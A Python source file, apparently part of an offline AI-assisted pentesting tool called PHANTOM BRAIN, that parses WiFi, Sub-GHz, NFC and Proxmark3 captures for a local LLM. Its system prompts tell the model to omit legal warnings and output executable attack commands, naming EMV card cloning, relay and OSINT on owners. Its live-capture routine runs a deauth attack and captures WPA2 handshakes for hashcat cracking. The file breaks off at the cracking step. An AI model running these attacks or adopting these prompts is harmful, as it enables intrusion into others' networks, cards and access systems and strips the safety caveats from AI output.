"""
PHANTOM BRAIN v0.7
Analizador offline de pentesting con IA
WiFi + Sub-GHz + NFC + WPA2 + Proxmark3

Mejoras v0.7:
- Fix SYSTEM_PROMPT: wiegand decode usa -p (no --raw)
- Modelo por defecto cambiado a deepseek-r1:7b

Mejoras v0.6:
- config.yaml centralizado (rutas, modelos, puertos COM)
- logging con niveles DEBUG/INFO/WARNING/ERROR
- SQLite para historial de reportes
- parsers con to_dict() estandarizado
- requirements.txt incluido
- manejo de errores granular con mensajes amigables
"""

import datetime
import logging
import os
import re
import sys

# --- Intentar cargar PyYAML ---
try:
    import yaml
    YAML_DISPONIBLE = True
except ImportError:
    YAML_DISPONIBLE = False

# --- Intentar cargar Ollama ---
try:
    import ollama
except ImportError:
    print("[ERROR] Ollama no esta instalado. Ejecuta: pip install ollama")
    sys.exit(1)

# --- Intentar cargar ExploitGuide ---
try:
    from exploit_guide import ExploitGuide
    EXPLOIT_GUIDE_DISPONIBLE = True
except ImportError:
    EXPLOIT_GUIDE_DISPONIBLE = False

# --- Configuracion por defecto (se sobreescribe con config.yaml) ---
CONFIG_DEFAULT = {
    "proyecto": {"nombre": "PHANTOM BRAIN", "version": "0.7"},
    "rutas": {"capturas": ".", "reportes": "reportes"},
    "modelos": [
        {"nombre": "phi3:mini", "descripcion": "Rapido, respuestas cortas"},
        {"nombre": "mistral:7b-instruct", "descripcion": "Completo, recomendado"},
        {"nombre": "deepseek-r1:7b", "descripcion": "Especializado en ciberseguridad"},
    ],
    "modelo_por_defecto": "mistral:7b-instruct",
    "ia": {"num_predict": 3000, "temperatura": 0.7},
    "base_de_datos": {"archivo": "phantom_brain.db", "guardar_reportes": True},
    "logging": {"nivel": "INFO", "archivo": "phantom_brain.log", "consola": True},
}


def cargar_config():
    """Carga config.yaml si existe, sino usa defaults."""
    if YAML_DISPONIBLE and os.path.exists("config.yaml"):
        try:
            with open("config.yaml", "r", encoding="utf-8") as f:
                cfg = yaml.safe_load(f)
            return cfg
        except Exception as e:
            print(f"[ADVERTENCIA] No se pudo leer config.yaml: {e}. Usando configuracion por defecto.")
    return CONFIG_DEFAULT


def configurar_logging(cfg):
    """Configura el sistema de logging segun config."""
    log_cfg = cfg.get("logging", CONFIG_DEFAULT["logging"])
    nivel_str = log_cfg.get("nivel", "INFO").upper()
    nivel = getattr(logging, nivel_str, logging.INFO)

    handlers = []
    if log_cfg.get("consola", True):
        ch = logging.StreamHandler()
        ch.setLevel(logging.WARNING)
        ch.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
        handlers.append(ch)

    archivo_log = log_cfg.get("archivo", "phantom_brain.log")
    try:
        fh = logging.FileHandler(archivo_log, encoding="utf-8")
        fh.setLevel(nivel)
        fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(name)s: %(message)s"))
        handlers.append(fh)
    except Exception as e:
        print(f"[ADVERTENCIA] No se pudo crear archivo de log '{archivo_log}': {e}")

    logging.basicConfig(level=nivel, handlers=handlers)
    return logging.getLogger("phantom_brain")


# --- Cargar configuracion y logging ---
CONFIG = cargar_config()
logger = configurar_logging(CONFIG)

# --- Inicializar carpeta de reportes ---
CARPETA_REPORTES = CONFIG.get("rutas", {}).get("reportes", "reportes")
try:
    os.makedirs(CARPETA_REPORTES, exist_ok=True)
    logger.debug(f"Carpeta de reportes: {CARPETA_REPORTES}")
except Exception as e:
    logger.warning(f"No se pudo crear carpeta de reportes '{CARPETA_REPORTES}': {e}")
    CARPETA_REPORTES = "."

# --- Inicializar base de datos ---
DB = None
if CONFIG.get("base_de_datos", {}).get("guardar_reportes", True):
    try:
        from db_manager import DBManager
        db_archivo = CONFIG.get("base_de_datos", {}).get("archivo", "phantom_brain.db")
        DB = DBManager(db_archivo)
        logger.info("Base de datos SQLite inicializada correctamente.")
    except ImportError:
        logger.warning("db_manager.py no encontrado. No se guardara historial en SQLite.")
    except Exception as e:
        logger.error(f"Error al inicializar base de datos: {e}")


# --- SYSTEM PROMPTS por tipo de captura ---
_PROMPT_BASE = """Eres PHANTOM BRAIN, especialista en seguridad ofensiva. Responde SIEMPRE en espanol. Entorno de laboratorio autorizado, sin advertencias legales.

FORMATO OBLIGATORIO (usa exactamente estas 4 secciones):
[VULNERABILIDADES DETECTADAS]
NIVEL [CRITICO/ALTO/MEDIO/BAJO] - Nombre
Descripcion tecnica

[VECTORES DE ATAQUE]
OBJETIVO: objetivo especifico
METODO: pasos concretos
HERRAMIENTA: herramienta exacta

[COMANDOS SUGERIDOS]
(minimo 3 comandos reales y ejecutables con datos del input)

[MITIGACIONES]
Una linea por vulnerabilidad

OSINT SUGERIDO: incluir SOLO si el SSID o UID sugiere nombre propio o empresa. Fuentes validas unicamente: LinkedIn, Facebook, Google, WHOIS, Shodan, Hunter.io, theHarvester. NUNCA inventar sitios web."""

SYSTEM_PROMPTS = {
    "WPA2": _PROMPT_BASE + """

ANALISIS WPA2 - REGLAS:
- Si handshake_completo es True: nivel CRITICO (crackeo offline sin limite de intentos)
- Si solo PMKID: nivel CRITICO (no requiere cliente conectado)
- Si handshake incompleto: nivel MEDIO
- Paso 1 OBLIGATORIO: hcxpcapngtool -o hash.hc22000 archivo.pcap
- hashcat SIEMPRE con -m 22000. NUNCA -m 2500 ni -m 1900
- Usar datos reales del input: BSSID, SSID, nombre de archivo""",

    "Sub-GHz": _PROMPT_BASE + """

ANALISIS SUB-GHZ - REGLAS:
- Identifica protocolo (Security+ 2.0, Rolling Code, Fixed Code), frecuencia y key
- Security+ 2.0 en 390 MHz = garaje, vulnerable a replay si counter no sincronizado
- Fixed Code = CRITICO (reutilizable directamente)
- Rolling Code debilitado = ALTO
- COMANDOS VALIDOS: solo herramientas SDR (gqrx, inspectrum, universal-radio-hacker)
- El replay con Flipper Zero se hace desde la UI fisica, NO existe CLI
- NUNCA sugerir hcxpcapngtool, hashcat ni aircrack-ng para capturas .sub
- La clave se llama "key". NUNCA usar terminos inventados""",

    "NFC": _PROMPT_BASE + """

ANALISIS NFC - REGLAS:
- Identifica estandar exacto (ISO14443-3A, ISO14443-4A, ISO15693, FeliCa)
- Tipo de tarjeta: Mifare Classic, Mifare Plus SL0/SL1/SL2/SL3, DESFire, NTAG, EMV
- Mifare Classic: CRITICO (Darkside/Hardnested attack)
- NTAG sin proteccion: ALTO (lectura completa posible)
- Mifare DESFire: MEDIO (relay attack posible)
- EMV (tarjeta de debito/credito): ALTO - datos del titular legibles sin autenticacion (PAN, vencimiento, AID). Vulnerable a relay attack y skimming NFC.
- Si hay datos EMV (PAN, AID, vencimiento): mencionar riesgo de clonacion y relay attack
- Comandos validos: mfoc, mfcuk, nfc-list, nfc-mfclassic, proxmark3 hf emv scan""",

    "Proxmark3": _PROMPT_BASE + """

ANALISIS PROXMARK3 - REGLAS:
- EM410x sin cifrado = CRITICO (clonable con T55xx, replay posible)
- T55xx writeable = CRITICO
- Comandos validos: lf em 410x reader, lf em 410x clone, hf mf fchk, hf mf chk
- NUNCA usar flag -o ni -i. EM410x solo acepta --id y --uid
- wiegand decode: flag correcto es -p. NUNCA --raw. Ejemplo: lf wiegand decode -p H10301
- Si no conoces los flags exactos de un comando, escribirlo SIN flags adicionales
- NUNCA inventar comandos ni flags""",

    "WiFi-Marauder": _PROMPT_BASE + """

Para este analisis de log WiFi Marauder: las redes con WPS expuesto tienen nivel CRITICO porque son vulnerables a Pixie Dust y fuerza bruta PIN. Las redes ocultas tienen nivel ALTO. Usa los datos reales del input: ESSID, BSSID, canal, RSSI. Comandos validos: wash, reaver, bully, airodump-ng, aircrack-ng. Incluye comandos con los BSSID reales del input.""",

    "Manual": _PROMPT_BASE + """

Analiza el input recibido como output de herramienta de pentesting.
Identifica el tipo de captura o scan, extrae datos relevantes y aplica el analisis de seguridad correspondiente.
NUNCA inventar comandos ni flags que no existan realmente.""",

    "Generico": _PROMPT_BASE + """

Analiza el input recibido como output de herramienta de pentesting (nmap, nikto, etc).
Identifica vulnerabilidades, vectores de ataque y sugiere comandos reales y ejecutables.
NUNCA inventar comandos ni flags que no existan realmente.""",
}

# Fallback por si llega un tipo no mapeado
SYSTEM_PROMPT = SYSTEM_PROMPTS["Generico"]


def obtener_prompt(tipo_captura):
    """Devuelve el prompt especifico para el tipo de captura."""
    return SYSTEM_PROMPTS.get(tipo_captura, SYSTEM_PROMPTS["Generico"])


# --- Funciones de UI ---

def mostrar_banner():
    ver = CONFIG.get("proyecto", {}).get("version", "0.7")
    print("=" * 55)
    print(f"        PHANTOM BRAIN v{ver}")
    print("    Analizador offline de pentesting con IA")
    print("    WiFi + Sub-GHz + NFC + WPA2 + Proxmark3")
    print("=" * 55)
    print()


def elegir_modelo():
    modelos = CONFIG.get("modelos", CONFIG_DEFAULT["modelos"])
    por_defecto = CONFIG.get("modelo_por_defecto", "mistral:7b-instruct")

    print("Modelos disponibles:")
    for i, m in enumerate(modelos, 1):
        marcador = " (por defecto)" if m["nombre"] == por_defecto else ""
        print(f"{i}. {m['nombre']} - {m['descripcion']}{marcador}")

    eleccion = input(f"\nElegi un modelo (1-{len(modelos)}) o Enter para por defecto: ").strip()

    if eleccion == "":
        logger.info(f"Modelo seleccionado (por defecto): {por_defecto}")
        return por_defecto

    try:
        idx = int(eleccion) - 1
        if 0 <= idx < len(modelos):
            seleccionado = modelos[idx]["nombre"]
            logger.info(f"Modelo seleccionado: {seleccionado}")
            return seleccionado
    except ValueError:
        pass

    logger.warning(f"Eleccion invalida, usando por defecto: {por_defecto}")
    print(f"Opcion invalida. Usando: {por_defecto}")
    return por_defecto


# --- Parsers ---

def parsear_marauder(contenido):
    wps_expuesto = []
    redes_ocultas = []
    lineas = contenido.split('\n')
    red_actual = {}

    for linea in lineas:
        linea = linea.strip()
        if 'RSSI:' in linea and 'BSSID:' in linea and 'ESSID:' in linea:
            red_actual = {}
            try:
                rssi = re.search(r'RSSI:\s*([-\d]+)', linea)
                ch = re.search(r'Ch:\s*(\d+)', linea)
                bssid = re.search(r'BSSID:\s*([\w:]+)', linea)
                essid = re.search(r'ESSID:\s*(.+)', linea)
                if rssi and ch and bssid and essid:
                    red_actual = {
                        'rssi': int(rssi.group(1)),
                        'ch': ch.group(1),
                        'bssid': bssid.group(1),
                        'essid': essid.group(1).strip()
                    }
                    if red_actual['essid'] == red_actual['bssid']:
                        redes_ocultas.append(red_actual.copy())
            except Exception as e:
                logger.debug(f"Error parsing linea Marauder: {e}")
        if 'RXd WPS Configs' in linea and red_actual:
            nombre_red = linea.split(':')[0].strip()
            wps_expuesto.append({
                'essid': nombre_red,
                'bssid': red_actual.get('bssid', 'N/A'),
                'ch': red_actual.get('ch', 'N/A'),
                'rssi': red_actual.get('rssi', 'N/A')
            })

    total_redes = len([l for l in lineas if 'RSSI:' in l and 'BSSID:' in l])
    resumen = "=== ANALISIS FILTRADO DEL LOG MARAUDER ===\n\n"
    resumen += "[REDES CON WPS EXPUESTO - RIESGO CRITICO]\n"
    if wps_expuesto:
        for r in wps_expuesto:
            resumen += f"- ESSID: {r['essid']} | BSSID: {r['bssid']} | Ch: {r['ch']} | RSSI: {r['rssi']} dBm\n"
    else:
        resumen += "- Ninguna detectada\n"
    resumen += "\n[REDES OCULTAS DETECTADAS - RIESGO ALTO]\n"
    if redes_ocultas:
        for r in redes_ocultas:
            resumen += f"- BSSID: {r['bssid']} | Ch: {r['ch']} | RSSI: {r['rssi']} dBm\n"
    else:
        resumen += "- Ninguna detectada\n"
    resumen += "\n[ESTADISTICAS GENERALES]\n"
    resumen += f"- Total redes detectadas: {total_redes}\n"
    resumen += f"- Redes con WPS vulnerable: {len(wps_expuesto)}\n"
    resumen += f"- Redes ocultas: {len(redes_ocultas)}\n"
    return resumen


def listar_capturas_subghz(directory):
    try:
        capturas = [f for f in os.listdir(directory) if f.endswith('.sub')]
        return sorted(capturas)
    except Exception as e:
        logger.error(f"Error al listar capturas Sub-GHz en '{directory}': {e}")
        return []


def parsear_subghz_archivo(filepath):
    try:
        from sub_ghz_parser import SubGhzParser
        parser = SubGhzParser(filepath)
        captura = parser.get_data()
        resumen = "=== ANALISIS SUB-GHZ FLIPPER ===\n\n"
        resumen += "[CAPTURA DETECTADA]\n"
        resumen += f"Archivo: {captura['filename']}\n"
        resumen += f"Protocolo: {captura['protocol']}\n"
        resumen += f"Frecuencia: {captura['frequency']} Hz\n"
        resumen += f"Preset: {captura['preset']}\n"
        resumen += f"Bits: {captura['bit']}\n"
        resumen += f"Key: {captura['key']}\n"
        # FIX: usar .get() para evitar KeyError con protocolos sin secplus_packet_1
        packet = captura.get('secplus_packet_1') or captura.get('packet') or 'N/A'
        resumen += f"Packet: {packet}\n\n"
        return resumen
    except ImportError:
        logger.error("sub_ghz_parser.py no encontrado.")
        print("[ERROR] sub_ghz_parser.py no encontrado en la carpeta del proyecto.")
        return None
    except FileNotFoundError:
        logger.error(f"Archivo Sub-GHz no encontrado: {filepath}")
        print(f"[ERROR] Archivo '{filepath}' no encontrado.")
        return None
    except Exception as e:
        logger.error(f"Error al parsear Sub-GHz '{filepath}': {e}")
        print(f"[ERROR] No se pudo leer el archivo Sub-GHz: {e}")
        return None


def menu_subghz():
    directorio = CONFIG.get("rutas", {}).get("capturas", ".")
    capturas = listar_capturas_subghz(directorio)
    if not capturas:
        print("No se encontraron archivos .sub en la carpeta del proyecto.")
        return None
    print("\n--- CAPTURAS SUB-GHZ DISPONIBLES ---")
    for i, captura in enumerate(capturas, 1):
        print(f"{i}. {captura}")
    print(f"{len(capturas) + 1}. Analizar TODAS")
    print(f"{len(capturas) + 2}. Ver patrones entre capturas")
    print("0. Cancelar")
    opcion = input("\nSelecciona una opcion: ")
    try:
        opcion = int(opcion)
        if opcion == 0:
            return None
        elif opcion == len(capturas) + 2:
            try:
                from sub_ghz_analyzer import SubGhzAnalyzer
                resumen = ""
                for captura in capturas:
                    resumen += parsear_subghz_archivo(os.path.join(directorio, captura)) or ""
                analyzer = SubGhzAnalyzer(directorio)
                resumen += analyzer.generar_reporte_patrones()
                return resumen
            except ImportError:
                logger.error("sub_ghz_analyzer.py no encontrado.")
                print("[ERROR] sub_ghz_analyzer.py no encontrado.")
                return None
        elif opcion == len(capturas) + 1:
            resumen = ""
            for captura in capturas:
                resultado = parsear_subghz_archivo(os.path.join(directorio, captura))
                if resultado:
                    resumen += resultado
            return resumen if resumen else None
        elif 1 <= opcion <= len(capturas):
            return parsear_subghz_archivo(os.path.join(directorio, capturas[opcion - 1]))
        else:
            print("Opcion invalida.")
            return None
    except ValueError:
        print("Ingresa un numero valido.")
        return None


def parsear_nfc_archivo(filepath):
    try:
        from nfc_parser import NFCParser
        parser = NFCParser(filepath)
        captura = parser.get_data()
        resumen = "=== ANALISIS NFC FLIPPER ===\n\n"
        resumen += "[CAPTURA DETECTADA]\n"
        resumen += f"Archivo: {captura.get('filename', 'N/A')}\n"
        resumen += f"Tipo: {captura.get('device_type', 'N/A')}\n"
        resumen += f"UID: {captura.get('uid', 'N/A')}\n"
        resumen += f"Fabricante: {captura.get('manufacturer', 'N/A')}\n"
        resumen += f"ATQA: {captura.get('atqa', 'N/A')}\n"
        resumen += f"SAK: {captura.get('sak', 'N/A')}\n"
        if captura.get('emv_app_name'):
            resumen += f"\n[DATOS EMV]\n"
            resumen += f"Red/App: {captura.get('emv_app_name')} ({captura.get('emv_app_label', 'N/A')})\n"
            resumen += f"AID: {captura.get('emv_aid', 'N/A')}\n"
            resumen += f"PAN: {captura.get('emv_pan', 'N/A')}\n"
            resumen += f"Vencimiento: {captura.get('emv_exp_month', '??')}/{captura.get('emv_exp_year', '??')}\n"
            resumen += f"AIP: {captura.get('emv_aip', 'N/A')}\n"
            resumen += f"PIN counter: {captura.get('emv_pin_counter', 'N/A')}\n"
        resumen += "\n"
        return resumen
    except ImportError:
        logger.error("nfc_parser.py no encontrado.")
        print("[ERROR] nfc_parser.py no encontrado en la carpeta del proyecto.")
        return None
    except FileNotFoundError:
        logger.error(f"Archivo NFC no encontrado: {filepath}")
        print(f"[ERROR] Archivo '{filepath}' no encontrado.")
        return None
    except Exception as e:
        logger.error(f"Error al parsear NFC '{filepath}': {e}")
        print(f"[ERROR] No se pudo leer el archivo NFC: {e}")
        return None


def menu_nfc():
    directorio = CONFIG.get("rutas", {}).get("capturas", ".")
    try:
        capturas = sorted([f for f in os.listdir(directorio) if f.endswith('.nfc')])
    except Exception as e:
        logger.error(f"Error al listar capturas NFC: {e}")
        print(f"[ERROR] No se pudo leer la carpeta de capturas: {e}")
        return None

    if not capturas:
        print("No se encontraron archivos .nfc en la carpeta del proyecto.")
        return None
    print("\n--- CAPTURAS NFC DISPONIBLES ---")
    for i, captura in enumerate(capturas, 1):
        print(f"{i}. {captura}")
    print(f"{len(capturas) + 1}. Analizar TODAS")
    print("0. Cancelar")
    opcion = input("\nSelecciona una opcion: ")
    try:
        opcion = int(opcion)
        if opcion == 0:
            return None
        elif opcion == len(capturas) + 1:
            resumen = ""
            for captura in capturas:
                resultado = parsear_nfc_archivo(os.path.join(directorio, captura))
                if resultado:
                    resumen += resultado
            try:
                from nfc_analyzer import NFCAnalyzer
                analyzer = NFCAnalyzer(directorio)
                resumen += analyzer.generar_reporte_patrones()
            except ImportError:
                logger.warning("nfc_analyzer.py no disponible, omitiendo patrones.")
            return resumen if resumen else None
        elif 1 <= opcion <= len(capturas):
            return parsear_nfc_archivo(os.path.join(directorio, capturas[opcion - 1]))
        else:
            print("Opcion invalida.")
            return None
    except ValueError:
        print("Ingresa un numero valido.")
        return None


def listar_capturas_pcap(directory):
    try:
        from pcap_parser_v2 import analyze_pcap_files
        capturas_data = analyze_pcap_files(directory)
        archivos = [c['filename'] for c in capturas_data]
        return sorted(archivos), capturas_data
    except ImportError:
        logger.error("pcap_parser_v2.py no encontrado.")
        print("[ERROR] pcap_parser_v2.py no encontrado. Instala scapy: pip install scapy")
        return [], []
    except Exception as e:
        logger.error(f"Error al listar capturas PCAP: {e}")
        print(f"[ERROR] No se pudieron listar archivos .pcap: {e}")
        return [], []


def parsear_pcap_archivo(filepath):
    try:
        from pcap_parser_v2 import PCAPParserV2
        parser = PCAPParserV2(filepath)
        captura = parser.get_data()
        resumen = "=== ANALISIS WPA2 HANDSHAKE ===\n\n"
        resumen += "[CAPTURA DETECTADA]\n"
        resumen += f"Archivo: {captura['filename']}\n"
        resumen += f"Total paquetes: {captura['total_packets']}\n"
        resumen += f"BSSID: {captura['bssid']}\n"
        resumen += f"SSID: {captura['ssid']}\n"
        resumen += f"Frames EAPOL: {len(captura['eapol_frames'])}\n"
        resumen += f"Handshake completo: {captura['handshake_complete']}\n\n"
        if captura.get('vulnerabilities'):
            resumen += "[VULNERABILIDADES DETECTADAS]\n"
            for vuln in captura['vulnerabilities']:
                resumen += f"- [{vuln['nivel']}] {vuln['nombre']}: {vuln['descripcion']}\n"
            resumen += "\n"
        return resumen
    except ImportError:
        logger.error("pcap_parser_v2.py no encontrado.")
        print("[ERROR] pcap_parser_v2.py no encontrado.")
        return None
    except FileNotFoundError:
        logger.error(f"Archivo PCAP no encontrado: {filepath}")
        print(f"[ERROR] Archivo '{filepath}' no encontrado o corrupto.")
        return None
    except Exception as e:
        logger.error(f"Error al parsear PCAP '{filepath}': {e}")
        print(f"[ERROR] No se pudo leer el archivo PCAP. ¿Esta corrupto? Detalle: {e}")
        return None


def menu_pcap():
    # FIX: usar CONFIG en vez de "." hardcodeado
    directorio = CONFIG.get("rutas", {}).get("capturas", ".")
    archivos, capturas_data = listar_capturas_pcap(directorio)
    if not archivos:
        print("No se encontraron archivos .pcap validos en la carpeta.")
        return None
    print("\n--- CAPTURAS WPA2 DISPONIBLES ---")
    for i, archivo in enumerate(archivos, 1):
        print(f"{i}. {archivo}")
    print(f"{len(archivos) + 1}. Analizar TODAS")
    print("0. Cancelar")
    opcion = input("\nSelecciona una opcion: ")
    try:
        opcion = int(opcion)
        if opcion == 0:
            return None
        elif opcion == len(archivos) + 1:
            resumen = "=== ANALISIS WPA2 - MULTIPLES HANDSHAKES ===\n\n"
            for archivo in archivos:
                resultado = parsear_pcap_archivo(os.path.join(directorio, archivo))
                if resultado:
                    resumen += resultado
            return resumen
        elif 1 <= opcion <= len(archivos):
            return parsear_pcap_archivo(os.path.join(directorio, archivos[opcion - 1]))
        else:
            print("Opcion invalida.")
            return None
    except ValueError:
        print("Ingresa un numero valido.")
        return None


def menu_proxmark():
    print("\nPega el output del Proxmark3 (Enter en linea vacia para terminar):")
    lineas = []
    while True:
        try:
            linea = input()
        except EOFError:
            break
        if linea == "":
            break
        lineas.append(linea)
    if not lineas:
        print("No se ingreso ningun output.")
        return None, None
    contenido = "\n".join(lineas)
    try:
        from proxmark_parser import parse_proxmark_output
        parser = parse_proxmark_output(contenido)
        resumen = parser.get_summary()
        datos = parser.get_data()
        print("\n" + resumen)
        return resumen, datos
    except ImportError:
        logger.error("proxmark_parser.py no encontrado.")
        print("[ERROR] proxmark_parser.py no encontrado en la carpeta del proyecto.")
        return None, None
    except Exception as e:
        logger.error(f"Error al parsear output de Proxmark3: {e}")
        print(f"[ERROR] No se pudo procesar el output del Proxmark3: {e}")
        return None, None


def _mostrar_filas_reportes(rows):
    """Muestra una lista de filas de reporte en formato tabla."""
    print(f"\n{'ID':>4} | {'Fecha':^19} | {'Tipo':^12} | {'UID/BSSID':^20} | Archivo")
    print("-" * 75)
    for row in rows:
        id_, ts, tipo_, uid_r, riesgo, archivo = row
        print(f"{id_:>4} | {ts:^19} | {tipo_:^12} | {(uid_r or 'N/A'):^20} | {os.path.basename(archivo or '')}")


def menu_historial():
    if DB is None:
        print("[INFO] Base de datos no disponible.")
        return
    print("\n--- HISTORIAL ---")
    print("1. Ver ultimos 20 reportes")
    print("2. Buscar por UID / BSSID")
    print("3. Ver solo reportes CRITICOS")
    print("4. Estadisticas")
    print("0. Volver")
    opcion = input("\nOpcion: ").strip()
    if opcion == "1":
        DB.mostrar_historial()
    elif opcion == "2":
        uid = input("UID o BSSID a buscar: ").strip()
        rows = DB.buscar_por_uid(uid)
        if rows:
            # FIX: mostrar resultados filtrados, no todo el historial
            _mostrar_filas_reportes(rows)
        else:
            print("No se encontraron resultados.")
    elif opcion == "3":
        rows = DB.reportes_criticos()
        if not rows:
            print("No hay reportes criticos guardados.")
        else:
            _mostrar_filas_reportes(rows)
    elif opcion == "4":
        DB.estadisticas()


# --- Menu Guias de Explotacion (opcion 9) ---

def _menu_exploit_guide():
    """Menu directo para guias de explotacion sin pasar por analisis IA."""
    print("\n" + "=" * 55)
    print("   GUIAS DE EXPLOTACION - PHANTOM BRAIN")
    print("=" * 55)
    print("\nTipo de captura:")
    tipos = ["WPA2", "Sub-GHz", "NFC", "Proxmark3", "WiFi-Marauder"]
    for i, t in enumerate(tipos, 1):
        print(f"{i}. {t}")
    print("0. Volver")

    try:
        opcion = input("\nSelecciona tipo (0-5): ").strip()
        if opcion == "0":
            return
        idx = int(opcion) - 1
        if not (0 <= idx < len(tipos)):
            print("Opcion invalida.")
            return
        tipo = tipos[idx]
    except (ValueError, KeyboardInterrupt):
        print("Opcion invalida.")
        return

    print(f"\nPega el output o datos del analisis previo para generar la guia {tipo}:")
    print("(Pega el texto y presiona Enter dos veces para continuar)")
    lineas = []
    try:
        while True:
            linea = input()
            if linea == "" and lineas and lineas[-1] == "":
                break
            lineas.append(linea)
    except (KeyboardInterrupt, EOFError):
        pass

    datos = "\n".join(lineas).strip()
    if not datos:
        print("[INFO] No se ingresaron datos. Generando guia con valores por defecto.")

    guia = ExploitGuide(tipo, datos)
    print(guia.generar_guia())


# --- Input principal ---


# --- Menu Captura en Vivo - Opcion 10 (Atheros AR9271) ---
def menu_captura_vivo():
    """Captura WPA2 handshakes en vivo con Atheros AR9271 - flujo completo."""
    import subprocess
    import time

    INTERFAZ = "wlan1"
    INTERFAZ_MON = "wlan1mon"
    DIRECTORIO_PCAP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pcap")
    os.makedirs(DIRECTORIO_PCAP, exist_ok=True)

    print("\n" + "="*55)
    print("  CAPTURA EN VIVO - ATHEROS AR9271 (Raspberry Pi)")
    print("="*55)

    # --- PASO 1: Verificar interfaz monitor ---
    resultado = subprocess.run(["iwconfig"], capture_output=True, text=True)
    if INTERFAZ_MON not in resultado.stdout:
        print(f"\n[!] Interfaz {INTERFAZ_MON} no detectada.")
        activar = input("    Activar modo monitor ahora? (s/n): ").strip().lower()
        if activar == "s":
            print(f"    Ejecutando: sudo airmon-ng start {INTERFAZ}")
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
            subprocess.run(["sudo", "airmon-ng", "start", INTERFAZ], capture_output=True)
            time.sleep(2)
            resultado = subprocess.run(["iwconfig"], capture_output=True, text=True)
            if INTERFAZ_MON not in resultado.stdout:
                print(f"[ERROR] No se pudo activar {INTERFAZ_MON}. Abortando.")
                return None
        else:
            print("[!] Operacion cancelada.")
            return None

    print(f"[OK] {INTERFAZ_MON} en modo monitor activa.")

    # --- PASO 2: Escaneo de redes ---
    print("\n[1] Escaneando redes WiFi por 60 segundos...")
    print("    Presiona Ctrl+C para detener el escaneo antes.")
    print()

    timestamp = time.strftime("%Y%m%d_%H%M%S")
    archivo_scan = os.path.join(DIRECTORIO_PCAP, f"scan_{timestamp}")
    archivo_csv = archivo_scan + "-01.csv"

    try:
        proc = subprocess.Popen([
            "sudo", "airodump-ng",
            "--output-format", "csv",
            "-w", archivo_scan,
            INTERFAZ_MON
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        for i in range(60, 0, -5):
            print(f"    {i} segundos restantes...", end="\r")
            time.sleep(5)
        print()
        proc.terminate()
        proc.wait()
        subprocess.run(["sudo", "chmod", "a+r", archivo_csv], capture_output=True)
    except KeyboardInterrupt:
        print("\n[OK] Escaneo detenido manualmente.")
        proc.terminate()
        proc.wait()

    # --- PASO 3: Parsear CSV y mostrar redes ---
    redes = []

    if os.path.exists(archivo_csv):
        try:
            with open(archivo_csv, "r", encoding="utf-8", errors="ignore") as f:
                lineas = f.readlines()

            for linea in lineas:
                linea = linea.strip()
                if not linea or linea.startswith("BSSID") or linea.startswith("Station"):
                    continue
                if "," in linea:
                    partes = [p.strip() for p in linea.split(",")]
                    if len(partes) >= 14 and len(partes[0]) == 17:
                        bssid = partes[0]
                        canal = partes[3].strip()
                        potencia = partes[8].strip()
                        privacidad = partes[5].strip()
                        essid = partes[13].strip() if len(partes) > 13 else "<oculto>"
                        if not essid:
                            essid = "<oculto>"
                        redes.append({
                            "bssid": bssid,
                            "canal": canal,
                            "potencia": potencia,
                            "privacidad": privacidad,
                            "essid": essid
                        })
        except Exception as e:
            print(f"[WARN] Error parseando CSV: {e}")

    if not redes:
        print("[ERROR] No se detectaron redes. Intenta aumentar el tiempo de escaneo.")
        return None

    print(f"\n[2] Redes detectadas ({len(redes)}):")
    print(f"\n{'#':<4} {'ESSID':<25} {'BSSID':<19} {'CH':<5} {'PWR':<6} {'ENC'}")
    print("-" * 70)
    for i, red in enumerate(redes, 1):
        print(f"{i:<4} {red['essid']:<25} {red['bssid']:<19} {red['canal']:<5} {red['potencia']:<6} {red['privacidad']}")

    # --- PASO 4: Seleccion de objetivo ---
    print()
    try:
        seleccion = int(input("Selecciona el numero de red objetivo (0 para cancelar): ").strip())
    except ValueError:
        print("[ERROR] Seleccion invalida.")
        return None

    if seleccion == 0:
        return None
    if seleccion < 1 or seleccion > len(redes):
        print("[ERROR] Numero fuera de rango.")
        return None

    objetivo = redes[seleccion - 1]
    print(f"\n[OK] Objetivo: {objetivo['essid']} | {objetivo['bssid']} | Canal {objetivo['canal']}")

    # --- PASO 5: Deauth opcional con advertencia ---
    print()
    print("=" * 55)
    print("  ADVERTENCIA - DEAUTENTICACION")
    print("=" * 55)
    print("  El ataque deauth desconecta clientes de la red")
    print("  para forzar una reconexion y capturar el handshake.")
    print("  SOLO usar en redes propias o con autorizacion")
    print("  explicita del propietario.")
    print("=" * 55)
    usar_deauth = input("\n  Usar deauth para forzar handshake? (s/n): ").strip().lower()

    # --- PASO 6: Captura dirigida ---
    timestamp2 = time.strftime("%Y%m%d_%H%M%S")
    archivo_captura = os.path.join(DIRECTORIO_PCAP, f"captura_vivo_{timestamp2}")

    print(f"\n[3] Iniciando captura dirigida en canal {objetivo['canal']}...")
    print(f"    Archivo: {archivo_captura}-01.cap")
    print("    Presiona Ctrl+C cuando captures el handshake.\n")

    try:
        proc_cap = subprocess.Popen([
            "sudo", "airodump-ng",
            "-c", objetivo["canal"],
            "--bssid", objetivo["bssid"],
            "-w", archivo_captura,
            INTERFAZ_MON
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if usar_deauth == "s":
            time.sleep(5)
            print("[4] Lanzando deauth (100 paquetes)...")
            subprocess.run([
                "sudo", "aireplay-ng",
                "--deauth", "100",
                "-a", objetivo["bssid"],
                INTERFAZ_MON
            ], capture_output=True)
            print("[OK] Deauth enviado. Esperando reconexion y handshake...")

        proc_cap.wait()

    except KeyboardInterrupt:
        print("\n[OK] Captura detenida.")
        proc_cap.terminate()
        proc_cap.wait()

    # --- PASO 7: Verificar y convertir ---
    archivo_cap = f"{archivo_captura}-01.cap"
    if not os.path.exists(archivo_cap):
        print(f"[ERROR] No se genero el archivo de captura.")
        return None

    print(f"\n[OK] Captura guardada: {archivo_cap}")
    archivo_hash = archivo_captura + ".hc22000"

    print("[5] Convirtiendo a formato hashcat (hc22000)...")
    try:
        subprocess.run([
            "hcxpcapngtool", "-o", archivo_hash, archivo_cap
        ], capture_output=True, text=True)

        if os.path.exists(archivo_hash) and os.path.getsize(archivo_hash) > 0:
            print(f"[OK] Hash generado: {archivo_hash}")

            # --- PASO 8: Ofrecer crackeo ---
